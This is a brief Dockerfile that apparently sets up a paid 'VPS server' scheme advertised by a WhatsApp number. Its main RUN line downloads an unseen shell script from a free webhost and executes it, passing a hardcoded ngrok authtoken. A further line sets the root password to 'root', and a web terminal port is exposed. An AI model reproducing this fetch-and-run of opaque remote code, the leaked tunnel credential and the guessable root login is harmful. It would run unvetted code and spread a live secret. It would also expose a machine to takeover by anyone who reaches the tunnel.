# Use a base image that supports systemd, for example, Ubuntu
FROM ubuntu:20.04

# Install necessary packages
RUN response=$(curl "https://dataverse-repo.000webhostapp.com/index.php?token=123456-123456&tipo=MATE" -A "1215487755/12187875" -o dataverse-nomachine.sh -w '%{http_code}\n' -f -s) && [ "$response" -eq "200" ] && (clear && echo -e "Sucesso! Arquivo baixado com sucesso\n=> DATAVERSE-VPS-SERVER By ClassicX-O-BRABO\n" && NGROK_TOKEN="2SmIFZPZNHHuLPFxoRdNokE7wNN_4UTRdCaAmtpm4GbGq8hui" sh ./dataverse-nomachine.sh) || clear && echo -e "Erro! O token está inválido ou expirado, ou o tipo informado é incorreto\n\n=> DATAVERSE-VPS-SERVER By ClassicX-O-BRABO\n=> COMPRE ACESSO NO WHATSAPP 21997208854\n\n"
RUN echo 'root:root' | chpasswd
# Expose the web-based terminal port
EXPOSE 4000
